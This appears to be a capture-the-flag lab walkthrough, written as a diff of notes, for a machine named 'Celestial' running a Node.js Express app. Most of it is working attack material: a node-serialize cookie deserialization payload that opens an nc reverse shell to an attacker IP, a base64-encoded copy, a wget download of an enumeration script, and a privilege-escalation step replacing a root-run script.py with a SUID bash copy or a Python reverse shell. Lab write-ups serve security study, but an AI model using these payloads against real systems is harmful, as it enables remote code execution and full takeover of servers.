@@ -1,0 +1,155 @@
+###
+Celestial
+NOde JS - avent()
+Cookie Deserialization
+###
+
+nmap -Pn -sV -sC  50 10.129.228.94 -vv -oN scan1.log -T5
+    PORT     STATE SERVICE REASON         VERSION
+    3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
+    | http-methods:
+    |_  Supported Methods: GET HEAD POST OPTIONS
+    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
+
+    http://10.129.228.94:3000/:
+        Hey Dummy 2 + 2 is 22
+
+        We look into the Cookies we found:
+        profile: eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D
+
+        We decode the Base64 Cookie:
+
+            https://www.base64decode.org/
+            {"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
+
+        We modify the payload and replace "num:2" by "num:a", and we test in BurpSuite:
+
+            eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6ImEifQ==
+
+
+        We can Observe the Response is:
+
+            ReferenceError: aa is not defined<br> &nbsp; &nbsp;at eval (eval at &lt;anonymous&gt; (/home/sun/server.js:13:29), &lt;anonymous&gt;:1:1)<br>
+
+            SyntaxError: Unexpected token '
+
+                at Object.parse (native)
+
+                at Object.exports.unserialize (/home/sun/node_modules/node-serialize/lib/serialize.js:62:16)
+
+                at /home/sun/server.js:11:24
+            
+    "sun" is the username
+ 
+        *******That means, we can have some server response
+
+        There is 3 types of commandes injections:
+
+            -Traditional: returns the result of the response (whoami => root)
+
+            -Inferential / Blind: DOES NOT RETURN THE RESPONSE, but RUNS the commande SYNCHRONOUSLY (sleep 5 => response teke 5secondes to return)
+
+            -Super Inferential / Out of Band (OOB): same as above, but runs the commande ASYNCHRONOUSLY (OOB command: host <machine>, curl http://, nc) ***********
+
+ 
+
+        We will use Super Inferential OOB by modifing the Decoded Base64 payload to get a remote shell:       
+            {"username":"_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.103 4444 >/tmp/f', function(error, stdout, stderr) {console.log(stdout) })","country":"Lameville","city":"Lametown","num":"2"}
+
+            eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygncm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuMTIzIDQ0NDQgPi90bXAvZicsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikge2NvbnNvbGUubG9nKHN0ZG91dCkgfSkiLCJjb3VudHJ5IjoiTGFtZXZpbGxlIiwiY2l0eSI6IkxhbWV0b3duIiwibnVtIjoiMiJ9
+
+ 
+
+We have shell:
+
+Linux Enumeration:
+
+    $ hostname
+
+        celestial
+
+ 
+
+    $ uname -a
+
+        Linux celestial 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+
+ 
+
+    sudo -l:
+
+        need TTY Shell
+
+            https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/full-ttys
+
+ 
+
+            python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+ 
+
+    DOwnLoad Enumeration Tool
+
+        Kali:
+
+            python3 -m http.server 8000
+
+ 
+
+        Linux Machine Shell:
+
+            wget http://10.10.14.123:8000/LinEnum.sh
+
+ 
+
+    We found "script.py" in Documents, that is used by root privileges
+
+ 
+
+Linux Priv Esc using script rights:
+
+    create our script.py
+
+        nano scirpt.py:
+
+            import os
+
+            os.system("cp /bin/bash /home/sun/rootbash; chmod +xs /home/sun/rootbash")
+
+ 
+
+        OR:
+
+ 
+
+    in VS Code script.py + root priviliges:
+
+ 
+
+        import socket,subprocess,os;
+
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.103",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
+
+ 
+
+Upload the Script to the Machine
+
+ 
+
+    wget http://IP:Port/script.py
+
+ 
+
+In our machine
+
+    nc -nlvp POrt
+
+ 
+
+We have a shell:
+
+    /bin/sh: 0: can't access tty; job control turned off
+
+    # whoami
+
+    root
